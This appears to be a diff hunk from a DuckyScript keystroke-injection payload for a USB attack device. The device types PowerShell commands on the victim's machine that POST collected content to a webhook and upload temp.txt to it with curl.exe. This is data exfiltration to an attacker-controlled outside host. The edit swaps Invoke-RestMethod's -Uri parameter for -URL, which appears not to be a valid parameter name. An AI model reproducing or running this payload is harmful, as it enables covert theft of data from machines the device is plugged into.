@@ -19,7 +19,7 @@ DELAY 1500
 STRING $payload=[PSCustomObject]@{ content=$content }
 ENTER
 DELAY 1500
-STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
+STRING Invoke-RestMethod -ContentType 'Application/Json' -URL $webhook -Method Post -Body ($payload | ConvertTo-Json)
 ENTER
 DELAY 1500
 STRING curl.exe -F "file1=@temp.txt" $webhook
